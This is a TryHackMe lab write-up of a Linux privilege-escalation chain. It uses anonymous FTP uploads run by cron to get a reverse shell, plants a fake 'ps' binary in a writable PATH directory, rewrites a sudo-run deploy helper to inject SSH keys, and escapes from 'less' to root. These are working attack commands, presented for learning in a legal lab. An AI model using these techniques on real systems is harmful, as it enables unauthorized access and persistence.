# Jump - TryHackMe

Linux machine with a five-level privilege escalation chain. Entry via FTP with a writable
incoming directory executed by a cron job. Escalation proceeds through a systemd PATH
hijacking, a writable deployment helper script, and a GTFOBins `less` escape to root.

Target: `10.65.166.136`

---

## Reconnaissance

```bash
nmap -sV -sC 10.65.166.136
```

Two open ports:

- FTP (21) - anonymous login allowed
- SSH (22) - used for lateral access after each escalation step

---

## Enumeration

### FTP - Writable Incoming Directory

Anonymous FTP login succeeds. The `/srv/ftp/incoming` directory accepts uploads. A cron
job running as `dev_user` executes all `.sh` files in that directory every minute via a
wrapper script `scan_uploads.sh`.

```bash
ftp 10.65.166.136
ls -la
# drwxrwxrwx incoming/
```

---

## Initial Access - Cron Job Execution

Uploading a reverse shell script to the incoming directory triggers execution within one
minute of the next cron tick.

```bash
# On attacker (10.65.96.135):
nc -lvnp 4444

# On FTP client:
put revshell.sh incoming/revshell.sh
```

Shell received as `dev_user`.

---

## Privilege Escalation

### dev_user to monitor_user - PATH Hijacking via Systemd

Standard cron enumeration finds nothing exploitable for `dev_user`. The vector is a
systemd timer:

```bash
systemctl list-timers --all
grep -Ri healthcheck /etc/systemd/
```

A `healthcheck` service runs as `monitor_user` and calls `ps` without an absolute path.
The service `PATH` variable includes `/opt/dev/bin` before the system directories, and
that directory is writable by `dev_user`.

```bash
# Create a fake ps binary that injects an SSH key
cat > /opt/dev/bin/ps << 'EOF'
#!/bin/bash
mkdir -p /home/monitor_user/.ssh
echo "ssh-rsa AAAA..." >> /home/monitor_user/.ssh/authorized_keys
chmod 600 /home/monitor_user/.ssh/authorized_keys
EOF
chmod +x /opt/dev/bin/ps

# Wait for the next service tick, then connect:
ssh monitor_user@10.65.166.136 -i id_rsa
```

The key mistake to avoid: the `authorized_keys` target must be in the home of the user
running the exploited process (`monitor_user`), not the current user's home.

### monitor_user to ops_user - Writable Deployment Helper

```bash
sudo -l
# (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

Inspecting `deploy.sh` reveals it runs `./deploy_helper.sh` relative to `/opt/app`. That
directory is writable by `monitor_user`.

```bash
cat /usr/local/bin/deploy.sh
# cd /opt/app && ./deploy_helper.sh

echo 'mkdir -p /home/ops_user/.ssh && echo "ssh-rsa AAAA..." >> /home/ops_user/.ssh/authorized_keys' \
  > /opt/app/deploy_helper.sh
chmod +x /opt/app/deploy_helper.sh

sudo -u ops_user /usr/local/bin/deploy.sh
ssh ops_user@10.65.166.136 -i id_rsa
```

### ops_user to root - GTFOBins less

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/less

sudo less /etc/hosts
```

Inside `less`, shell escape:

```
!/bin/bash
```

Root shell obtained. Root flag is in `/root/root.txt`.

---

## Key Takeaways

- PATH hijacking on a systemd service works the same way as on cron: find a binary called
  without absolute path, check if any directory earlier in `PATH` is writable, plant your
  binary and wait for the next execution. `systemctl list-timers --all` and
  `grep -Ri <service-name> /etc/systemd/` are the enumeration entry points.
- Run `sudo -l` at every user boundary, without exception. In this machine each level had
  a different vector - cron, systemd, sudo chain, GTFOBins - and `sudo -l` was the
  discovery mechanism for the last two.
- When injecting SSH keys via an exploit, write to the `authorized_keys` of the user
  running the exploited process, not the current user's home. Confusing these two homes
  is the most common failure mode in multi-user escalation chains.
- Relative paths inside sudo-accessible scripts are an immediate privesc if the working
  directory is writable. Audit with `cat` before attempting anything else.

---

## Disclaimer

This machine was completed in the controlled, legal environment provided by TryHackMe.
All actions were performed strictly for educational purposes.
